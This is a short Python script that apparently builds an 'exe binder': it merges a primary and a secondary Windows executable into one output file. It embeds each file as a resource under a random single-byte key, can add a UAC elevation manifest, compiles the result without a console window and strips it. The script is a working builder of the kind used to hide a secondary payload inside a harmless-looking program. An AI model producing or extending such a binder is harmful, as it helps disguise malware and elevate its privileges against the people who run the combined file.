#!/usr/bin/env python

import os
import random
import argparse
from res2header import res2header


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Bind 2 exe files.")
    parser.add_argument('primary', help="Primary exe file.")
    parser.add_argument('secondary', help="secondary exe file.")
    parser.add_argument('--uac', action="store_true", help="Enable uac.")
    parser.add_argument('--x86', action="store_true", help="Enable -m32 CXXFLAG, when build in x64 platform.")
    parser.add_argument('--out', type=str, default="new.exe", help="Output binded exe file.")

    args = parser.parse_args()

    res1 = res2header(args.primary, "res1.h", chr(random.randint(0, 255)))
    res2 = res2header(args.secondary, "res2.h", chr(random.randint(0, 255)))

    with open("binder.cpp", "r") as rb:
        data = rb.read()
        data = data.replace("RES_1111", res1["res_name"])
        data = data.replace("RES_2222", res2["res_name"])

    with open("main.cpp", "w") as wm:
        wm.write(data)

    os.system("windres %s --input-format=rc -O coff -i uac.rc -o uac.res" % str("-F pe-i386" if args.x86 else ""))
    os.system("g++ %s -mwindows -O3 main.cpp %s -o %s" % (str("-m32" if args.x86 else ""), str("uac.res" if args.uac else ""), args.out))
    os.system("strip %s" % args.out)
    print("Bind to %s success! " % args.out)

    os.remove("res1.h")
    os.remove("res2.h")
    os.remove("main.cpp")
    os.remove("uac.res")
